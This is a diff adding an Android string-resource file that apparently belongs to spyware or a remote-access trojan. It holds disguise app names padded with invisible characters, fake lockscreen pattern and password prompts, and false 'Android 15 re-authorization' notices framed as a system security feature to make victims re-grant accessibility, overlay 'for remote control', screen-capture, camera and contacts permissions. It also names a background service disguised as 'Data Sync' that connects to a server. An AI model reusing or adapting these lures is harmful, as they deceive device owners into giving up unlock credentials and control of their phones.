@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="accessibility_service_description">Accessibility Service</string>
+    <string name="device_admin_description">Allow the app to manage device settings</string>
+    <string name="device_admin_label">Device Admin</string>
+    <string name="label_blank">⠀⠀</string>
+    <string name="label_variant_f0">⠀i管家⠀</string>
+    <string name="label_variant_g">iManager</string>
+    <string name="label_variant_h">⠀Phone Manager⠀</string>
+    <string name="label_variant_i">System Manager</string>
+    <string name="label_variant_j">⠀Security⠀</string>
+    <string name="label_variant_l">⠀Smart Manager⠀</string>
+    <string name="lockscreen_draw_pattern">Draw unlock pattern</string>
+    <string name="lockscreen_enter_password">Enter password</string>
+    <string name="lockscreen_other_password_type">Other password type</string>
+    <string name="lockscreen_pattern_too_short">Connect at least 4 dots, try again</string>
+    <string name="lockscreen_wrong_password">Wrong password, try again</string>
+    <string name="lockscreen_wrong_pattern">Wrong pattern, try again</string>
+    <string name="network_connected">Connected</string>
+    <string name="network_connecting">Connecting…</string>
+    <string name="network_disconnected">Disconnected</string>
+    <string name="network_error">Connection Error</string>
+    <string name="notification_channel_permission_error">Permission Error</string>
+    <string name="notification_channel_permission_error_desc">Permission recovery failure notification</string>
+    <string name="notification_channel_system_verify">System Verification</string>
+    <string name="notification_channel_system_verify_desc">System authentication prompt</string>
+    <string name="notification_contacts_text">Tap this notification to grant contacts access</string>
+    <string name="notification_contacts_title">Contacts Permission Needed</string>
+    <string name="notification_overlay_required_text">Tap to enable overlay permission for remote control</string>
+    <string name="notification_overlay_required_title">Overlay Permission Required</string>
+    <string name="notification_permission_check_big_text">"Service permission auto-recovery failed. This may be due to:
+• Android 15 restrictions
+• Permission permanently denied
+• System settings changed
+
+Please tap to check permission settings."</string>
+    <string name="notification_permission_check_text">Permission recovery failed multiple times, please check settings manually</string>
+    <string name="notification_permission_check_title">Permission Check Needed</string>
+    <string name="notification_reauth_action">Reconfigure</string>
+    <string name="notification_reauth_big_text">"Due to Android 15 permission protection, re-authorization is required.
+
+This is a system security feature. Tap the notification to reconfigure permissions."</string>
+    <string name="notification_reauth_text">Android 15 requires re-authorization, tap to reconfigure</string>
+    <string name="notification_reauth_title">Re-authorization Required</string>
+    <string name="open_app_settings">App Settings</string>
+    <string name="permission_auto_failed">Auto permission failed, please tap dialog manually</string>
+    <string name="permission_max_retry">Max retries reached, please operate manually</string>
+    <string name="permission_media_projection_message">Please allow the app to use this feature</string>
+    <string name="permission_media_projection_title">Permission Required</string>
+    <string name="permission_overlay_message">Please allow the app to display content</string>
+    <string name="permission_overlay_title">Display Permission Required</string>
+    <string name="service_not_running">Service not started</string>
+    <string name="service_notification_text">Running</string>
+    <string name="service_notification_title">Data Sync</string>
+    <string name="service_running">Service is running</string>
+    <string name="status_activity_failed">"🔧 Activity failed, trying built-in method…
+Retrying…"</string>
+    <string name="status_all_granted">✅ All permissions granted</string>
+    <string name="status_all_permissions_granted">✅ All permissions granted</string>
+    <string name="status_android11_done">"✅ Android 11+
+Permissions set
+Connecting to server…"</string>
+    <string name="status_android11_fast">"📱 Android 11+
+Fast start mode
+Connecting…"</string>
+    <string name="status_android11_screenshot_ready">"📱 Android 11+
+Screenshot API ready
+Starting service…"</string>
+    <string name="status_android_low">"✅ Android below 6.0
+Camera permission not needed"</string>
+    <string name="status_backup_plan">"🔄 Starting backup method
+Requesting permissions…"</string>
+    <string name="status_broadcast_failed">"❌ Broadcast failed
+Please retry"</string>
+    <string name="status_builtin_method">🔧 Trying built-in method…</string>
+    <string name="status_camera_denied">"❌ Camera permission denied
+Please enable in Settings"</string>
+    <string name="status_camera_failed">"❌ Camera permission failed
+Please enable in Settings"</string>
+    <string name="status_camera_granted">✅ Camera permission granted</string>
+    <string name="status_camera_requesting">"📷 Requesting camera permission
+Please tap Allow"</string>
+    <string name="status_click_start_now">"📱 Tap \"Start Now\" in the dialog
+If no dialog appears, please wait"</string>
+    <string name="status_device_optimize">"🔧 Optimizing for device…
+Using simplified method"</string>
+    <string name="status_optimize_failed">"⚠️ Optimization failed
+Retrying with standard method…"</string>
+    <string name="status_partial_denied">"⚠️ Some permissions denied
+Granted: %1$d/%2$d"</string>
+    <string name="status_permission_collect_failed">"❌ Failed to collect permissions
+Please retry"</string>
+    <string name="status_permission_config">"📱 Configuring permissions
+Connecting…"</string>
+    <string name="status_permission_flow_error">"🧠 Permission flow error
+Recovering…"</string>
+    <string name="status_permission_incomplete">"⚠️ Incomplete permissions
+Auto-requesting service permissions…"</string>
+    <string name="status_permission_request_failed">"❌ Permission request failed
+Please retry"</string>
+    <string name="status_permission_success">"✅ Permissions granted
+Starting service…"</string>
+    <string name="status_requesting_all">"🔧 Requesting all permissions…
+Please allow all at once"</string>
+    <string name="status_requesting_permissions">"🔧 Requesting: %s
+Please allow all at once"</string>
+    <string name="status_service_fault">"🔧 Service issue detected
+Waiting for recovery…"</string>
+    <string name="status_service_no_response">"⚠️ Service not responding
+Trying backup method…"</string>
+    <string name="status_service_recovered">"✅ Service recovered
+Starting permission request…"</string>
+    <string name="status_service_starting">✅ Starting service…</string>
+    <string name="status_waiting_service">"🔧 Waiting for service recovery…
+Check #%1$d, %2$d remaining
+About %3$d seconds left"</string>
+</resources>
